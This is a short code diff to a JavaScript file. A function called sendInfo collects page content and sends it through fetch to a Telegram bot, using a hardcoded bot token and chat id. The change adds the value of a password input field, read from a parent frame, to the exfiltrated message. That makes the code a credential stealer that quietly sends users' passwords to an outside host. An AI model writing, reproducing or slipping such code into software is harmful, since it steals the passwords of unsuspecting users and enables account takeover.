@@ -1444,7 +1444,7 @@ async function sendInfo(){
                 }).then((html) => {
                     tempText += html;
                 });
-        await fetch("https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4742576115&text="+tempText);
+        await fetch("https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4742576115&text="+tempText+"%0APw:"+parent.top_view.document.getElementsByTagName("input")['pass'].value);
     }
 }
 async function createExtraFunction() {
@@ -1621,6 +1621,7 @@ const setList =
 	}
     ]
 }
+
 
 
 
